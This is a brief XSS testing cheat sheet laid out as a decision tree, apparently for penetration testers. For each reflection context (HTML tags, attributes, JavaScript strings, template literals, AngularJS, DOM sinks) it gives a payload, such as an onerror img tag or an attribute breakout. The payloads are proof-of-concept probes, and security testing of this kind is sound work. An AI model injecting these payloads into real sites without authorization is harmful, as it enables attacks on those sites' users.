# XSS Context Decision Tree

Input Reflected?

│
├── No
│     └── Continue Testing
│
└── Yes

      │
      ├── Between HTML Tags?
      │
      │      └── Try
      │
      │          <img src=1 onerror=alert(1)>
      │
      ├── Inside Attribute?
      │
      │      └── Try
      │
      │          " onmouseover="alert(1)
      │
      ├── Inside JavaScript?
      │
      │      └── Try
      │
      │          ';alert(1)//
      │
      ├── Inside Backticks?
      │
      │      └── Try
      │
      │          ${alert(1)}
      │
      ├── AngularJS?
      │
      │      └── Try
      │
      │          {{7*7}}
      │
      └── DOM Sink?
             │
             ├── location
             ├── hash
             ├── search
             └── postMessage